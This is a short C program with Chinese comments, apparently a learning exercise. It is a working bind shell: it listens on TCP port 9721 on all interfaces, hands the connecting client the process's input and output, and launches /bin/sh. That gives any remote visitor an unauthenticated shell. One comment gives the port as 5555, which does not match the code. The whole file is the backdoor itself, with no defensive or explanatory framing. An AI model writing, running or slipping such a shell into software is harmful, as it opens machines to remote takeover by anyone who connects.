
#include<stdio.h> 
#include<sys/socket.h> 
#include<netinet/in.h> 
#include<unistd.h>
int main(){
    int socked = socket(AF_INET,SOCK_STREAM,0);
    if(socked == -1){
        printf("socket 申请失败\n");
        return -1;
    }
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           // IPv4
    server_addr.sin_port = htons(9721);         // 5555 端口
    server_addr.sin_addr.s_addr = INADDR_ANY;   // 监听所有来路
    if (bind(socked, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        printf("【成功】9721 端口已经占领！\n");
    } else {
        printf("【失败】端口可能被占用或权限不足。\n");
    }
    listen(socked, 0);
    printf("程序正在 9721 端口等客人，不信你连连看...\n");

    // 5. Accept: 接电话
    // 程序运行到这里会“卡住”，直到有人连接它才会继续往下走
    int clientfd = accept(socked, NULL, NULL);
    printf("【警告】侦测到有人连接！我已经抓到他了。\n");
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);

    char *const args[] = {"/bin/sh", NULL}; // 准备参数
    execve("/bin/sh", args, NULL);          // 正式启动
    return 0;
}


